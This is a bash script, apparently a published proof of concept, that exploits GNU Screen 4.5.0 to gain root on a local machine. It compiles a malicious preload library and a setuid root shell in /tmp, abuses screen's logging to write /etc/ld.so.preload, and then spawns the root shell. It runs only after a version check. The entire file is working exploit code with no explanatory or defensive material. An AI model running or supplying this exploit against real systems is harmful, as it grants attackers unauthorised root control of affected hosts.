#!/bin/bash
# Jie Liau
# Screen 4.5.0 so preload lib exploit for previlege escalation

function exploit () {
    cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

    cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c

    cd /etc
    umask 000 

    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
    screen -ls 
    /tmp/rootshell
}

SCREEN=$(screen -v 2>/dev/null)
if [ $? -ne 1 ]; then
    echo "Please install screen version 4.5.0 for local privilege escalation PoC"
    exit 1
else
    VERSION=$(echo $SCREEN | awk '{print $3}')
    if [ $VERSION != '4.05.00' ]; then
        echo "Please install screen version 4.5.0 for local privilege escalation PoC"
        exit 1
    else
        exploit
    fi
fi
